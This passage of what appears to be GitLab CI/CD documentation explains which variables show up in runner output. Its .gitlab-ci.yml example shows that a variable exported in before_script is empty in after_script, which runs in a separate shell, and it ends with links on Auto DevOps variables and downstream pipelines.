Regardless of the shell the scripts are executed in, the runner output includes:

- Predefined variables.
- Variables defined in:
  - Instance, group, or project CI/CD settings.
  - The `.gitlab-ci.yml` file in the `variables:` section.
  - The `.gitlab-ci.yml` file in the `secrets:` section.
  - The `config.toml`.

The runner cannot handle manual exports, shell aliases, and functions executed in the body of the script, like `export MY_VARIABLE=1`.

For example, in the following `.gitlab-ci.yml` file, the following scripts are defined:

```yaml
job:
 variables:
   JOB_DEFINED_VARIABLE: "job variable"
 before_script:
   - echo "This is the 'before_script' script"
   - export MY_VARIABLE="variable"
 script:
   - echo "This is the 'script' script"
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
 after_script:
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
```

When the runner executes the job:

1. `before_script` is executed:
   1. Prints to the output.
   1. Defines the variable for `MY_VARIABLE`.
1. `script` is executed:
   1. Prints to the output.
   1. Prints the value of `JOB_DEFINED_VARIABLE`.
   1. Prints the value of `CI_COMMIT_SHA`.
   1. Prints the value of `MY_VARIABLE`.
1. `after_script` is executed in a new, separate shell context:
   1. Prints to the output.
   1. Prints the value of `JOB_DEFINED_VARIABLE`.
   1. Prints the value of `CI_COMMIT_SHA`.
   1. Prints an empty value of `MY_VARIABLE`. The variable value cannot be detected because `after_script` is in a separate shell context to `before_script`.

## Related topics

- You can configure [Auto DevOps](../../topics/autodevops/_index.md) to pass CI/CD variables
  to a running application. To make a CI/CD variable available as an environment variable in the running application's container,
  [prefix the variable key](../../topics/autodevops/cicd_variables.md#configure-application-secret-variables)
  with `K8S_SECRET_`.

- The [Managing the Complex Configuration Data Management Monster Using GitLab](https://www.youtube.com/watch?v=v4ZOJ96hAck)
  video is a walkthrough of the [Complex Configuration Data Monorepo](https://gitlab.com/guided-explorations/config-data-top-scope/config-data-subscope/config-data-monorepo)
  working example project. It explains how multiple levels of group CI/CD variables
  can be combined with environment-scoped project variables for complex configuration
  of application builds or deployments.

  The example can be copied to your own group or instance for testing. More details
  on what other GitLab CI patterns are demonstrated are available at the project page.

- You can [pass CI/CD variables to downstream pipelines](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline).
  Use [`trigger:forward` keyword](../yaml/_index.md#triggerforward) to specify what type of variables
  to pass to the downstream pipeline.
